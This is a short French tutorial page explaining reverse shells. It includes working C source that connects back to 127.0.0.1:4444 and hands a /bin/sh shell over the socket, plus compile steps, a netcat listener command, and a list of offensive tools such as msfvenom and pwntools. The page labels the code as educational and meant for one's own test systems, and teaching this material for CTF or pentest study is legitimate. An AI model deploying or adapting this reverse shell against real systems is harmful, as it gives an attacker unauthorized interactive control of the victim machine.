# Reverse Shell

Un reverse shell est une connexion réseau inversée où la cible se connecte à l'attaquant, contournant les firewalls. La cible exécute un shell et redirige stdin/stdout/stderr vers un socket TCP connecté à l'attaquant.

⚠️ AVERTISSEMENT : Code éducatif. Uniquement sur tes propres systèmes de test. Usage malveillant est ILLÉGAL.

```c
// Reverse shell basique
int sock = socket(AF_INET, SOCK_STREAM, 0);
struct sockaddr_in addr = {
    .sin_family = AF_INET,
    .sin_port = htons(4444),
    .sin_addr.s_addr = inet_addr("127.0.0.1")
};
connect(sock, (struct sockaddr*)&addr, sizeof(addr));
dup2(sock, 0);  // stdin
dup2(sock, 1);  // stdout
dup2(sock, 2);  // stderr
execve("/bin/sh", NULL, NULL);
```

## Compilation

```bash
gcc example.c -o example
./example
```

## Concepts clés

- Socket TCP pour connexion réseau
- connect() vers IP:port de l'attaquant
- dup2() redirige stdin/stdout/stderr vers le socket
- execve() lance un shell interactif
- Bind shell (écoute) vs Reverse shell (se connecte)

## Exploitation

Attaquant écoute : `nc -lvp 4444`. Victime exécute reverse shell -> connexion à 127.0.0.1:4444. L'attaquant obtient un shell interactif.

En CTF/pentest : injecter le shellcode reverse shell ou exécuter un binaire. Permet de bypass les firewalls qui bloquent les connexions entrantes.

Variations : reverse shell TCP, UDP, ICMP, DNS tunneling, encryption (TLS).

## Outils

- netcat (nc) : écouter ou se connecter
- msfvenom : générer du shellcode reverse shell
- pwntools : automatiser l'exploitation
- socat : tunnel avancé
